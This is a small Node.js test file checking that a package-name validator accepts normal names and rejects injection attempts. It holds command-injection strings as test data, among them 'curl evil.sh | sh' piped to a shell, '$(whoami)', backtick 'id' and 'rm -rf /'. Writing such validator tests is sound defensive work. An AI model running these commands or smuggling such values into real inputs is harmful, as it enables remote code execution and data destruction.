import assert from 'node:assert';
import { validatePackages } from './validate-packages.ts';

assert.doesNotThrow(() => validatePackages(['numpy', 'numpy==1.26.0', '@scope/pkg@1.2.3']));
assert.throws(() => validatePackages(['x; curl evil.sh | sh']));
assert.throws(() => validatePackages(['$(whoami)']));
assert.throws(() => validatePackages(['pkg `id`']));
assert.throws(() => validatePackages(['pkg && rm -rf /']));

console.log('ok');
